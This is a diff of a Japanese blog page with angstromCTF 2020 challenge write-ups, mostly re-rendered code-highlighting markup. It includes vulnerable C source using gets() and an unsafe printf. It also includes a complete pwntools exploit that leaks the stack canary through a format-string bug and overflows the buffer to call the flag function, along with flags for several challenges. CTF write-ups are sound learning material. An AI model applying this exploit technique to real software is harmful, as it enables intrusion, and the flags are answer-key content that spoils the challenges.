 <p>Flag: <code>actf{that_gosh_darn_canary_got_me_pwned!}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -515,7 +506,7 @@ Hint: That printf call looks dangerous too&hellip;</p>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -571,63 +562,63 @@ Hint: That printf call looks dangerous too&hellip;</p>
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#define _GNU_SOURCE
-</span><span class="cp"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">wake</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Cock-a-doodle-doo! Cock-a-doodle-doo!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;        .-</span><span class="se">\&#34;</span><span class="s">-.&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       / 4 4 </span><span class="se">\\</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       </span><span class="se">\\</span><span class="s">_ v _/&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       //   </span><span class="se">\\\\</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;      ((     ))&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;=======</span><span class="se">\&#34;\&#34;</span><span class="s">===</span><span class="se">\&#34;\&#34;</span><span class="s">=======&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;         |||&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;         &#39;|&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;And my canary woke me up at 5 AM on the dot!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">greet</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">);</span>
-	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
-	<span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, &#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="n">strcat</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Anything else you want to tell me? &#34;</span><span class="p">);</span>
-	<span class="kt">char</span> <span class="n">info</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
-	<span class="n">gets</span><span class="p">(</span><span class="n">info</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-	<span class="n">wake</span><span class="p">();</span>
-	<span class="n">greet</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">wake</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Cock-a-doodle-doo! Cock-a-doodle-doo!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;        .-</span><span class="se">\&#34;</span><span class="s">-.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;       / 4 4 </span><span class="se">\\</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;       </span><span class="se">\\</span><span class="s">_ v _/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;       //   </span><span class="se">\\\\</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;      ((     ))&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======</span><span class="se">\&#34;\&#34;</span><span class="s">===</span><span class="se">\&#34;\&#34;</span><span class="s">=======&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;         |||&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;         &#39;|&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;And my canary woke me up at 5 AM on the dot!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">greet</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="nf">strcat</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Anything else you want to tell me? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">info</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">gets</span><span class="p">(</span><span class="n">info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">wake</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">greet</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <h3 id="solution-2">Solution</h3>
 <p>FSB (Format String Bug)を使ってCanaryをLeakし、Canaryを壊さないようにしてBOFをするチャレンジです。</p>
 <pre>
@@ -639,8 +630,8 @@ captureamerica@kali:~/CTF/angstromCTF_2020$ checksec canary
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </pre>
-<p><br />
-オフセットのサイズ(56バイト)と、Canaryが現れる位置(17)は、gdbで調べました。</p>
+<br />
+オフセットのサイズ(56バイト)と、Canaryが現れる位置(17)は、gdbで調べました。
 <p>以下のスクリーンショットは、最初の入力でAAAA、2回目の入力でBBBBを入れた後に見たスタックです。</p>
 <img src="https://captureamerica.github.io/writeups/img/angstromctf_canary_gdb.png" alt="angstromctf_canary_gdb.png">
 <p>Return Address (0x4009c9)の2つ前がCanaryです。Null(\00)で始まってます。</p>
@@ -661,11 +652,11 @@ flag()関数のアドレス。
 gef➤  x flag
 0x400787 <flag>:	0xe5894855
 </pre>
-<p><br />
-以下が今回書いたコードです。</p>
+<br />
+以下が今回書いたコードです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -696,39 +687,39 @@ gef➤  x flag
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
-    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
-    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/canary&#39;</span><span class="p">)</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%17$p&#34;</span><span class="p">)</span>
-<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">canary</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Nice to meet you, (.*)!\n&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="n">canary_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
-<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x400787</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Anything else you want to tell me? &#34;</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">7</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary_addr</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/canary&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./canary&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%17$p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Nice to meet you, (.*)!\n&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">canary_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x400787</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Anything else you want to tell me? &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-実行結果：</p>
+</div><br />
+実行結果：
 <pre>
 captureamerica@kali:~/CTF/angstromCTF_2020$ ./canary_solve.py 
 [+] Connecting to shell.actf.co on port 22: Done
@@ -759,7 +750,7 @@ actf{youre_a_canary_killer_>:(}
 <ul>
 <li>taking_off (ELF 64bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>簡単なやつだったんで、概要だけ。</p>
 <p>Ghidraでソースを確認すると、引数が4つ必要で、最初の3つは整数、最後の1個は文字列なのがわかります。</p>
@@ -774,7 +765,7 @@ please give flag
 Good job! You're ready to move on to bigger and badder rev!
 actf{th3y_gr0w_up_s0_f4st}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{th3y_gr0w_up_s0_f4st}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -790,16 +781,16 @@ Alternatively, find it at /problems/2020/windows_lives_matter/ on the shell serv
 <ul>
 <li>windows_of_opportunity.exe</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>やけに正解者が多いなと思ったら、案の定stringsで解けるやつでした。</p>
 <pre>
 captureamerica@kali:~/Downloads$ strings windows_of_opportunity.exe | grep -i ctf
 actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}
 </pre>
-<p><br />
-100点問題だし、たぶん想定解じゃないんだろうな。一生懸命作ったのに、かわいそう。</p>
-<p><br /></p>
+<br />
+100点問題だし、たぶん想定解じゃないんだろうな。一生懸命作ったのに、かわいそう。
+<br />
 <p>Flag: <code>actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}</code></p>
 <p><br /><br />
 <br /><br />
@@ -820,9 +811,9 @@ See if you can decode what he sent to me. It&rsquo;s in actf{} format</p>
 <ul>
 <li>transmission.wav</li>
 </ul>
-<p><br /></p>
-<h3 id="unsolved">(Unsolved)</h3>
-<p>はい、PicoCTF 2019でSSTVの問題ありましたね。今回のこれは、PSK31ってやつみたいです。</p>
+<br />
+### (Unsolved)
+はい、PicoCTF 2019でSSTVの問題ありましたね。今回のこれは、PSK31ってやつみたいです。
 <p>いくつかツールを試したんですが、いいのが見つからなくて、諦めました。</p>
 <p><br /><br />
 <br /><br /></p>
@@ -843,7 +834,7 @@ Hint: There are ways to run programs without using the shell.</p>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -887,59 +878,59 @@ Hint: There are ways to run programs without using the shell.</p>
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#define _GNU_SOURCE
-</span><span class="cp"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define FLAGSIZE 128
-</span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">print_flag</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
-    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">FLAGSIZE</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument count isn&#39;t right.&#34;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
